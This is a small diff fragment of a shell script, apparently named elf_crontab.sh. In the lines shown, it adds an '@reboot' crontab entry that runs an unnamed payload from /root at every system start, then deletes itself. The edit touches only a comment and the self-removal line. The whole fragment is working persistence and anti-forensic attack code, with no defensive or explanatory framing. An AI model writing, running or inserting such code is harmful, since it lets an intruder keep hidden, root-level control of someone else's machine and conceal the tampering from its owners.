@@ -39,5 +39,5 @@ echo "@reboot sleep 30; /root/$PAYLOAD 2>&1" >> temp_cron
 crontab temp_cron
 rm temp_cron
 
-# Remove itself (i don't use $0 because if invoked from shell will remove bash !
-rm elf_crontab.sh
+# Remove itself 
+rm elf_crontab.sh 2>&1
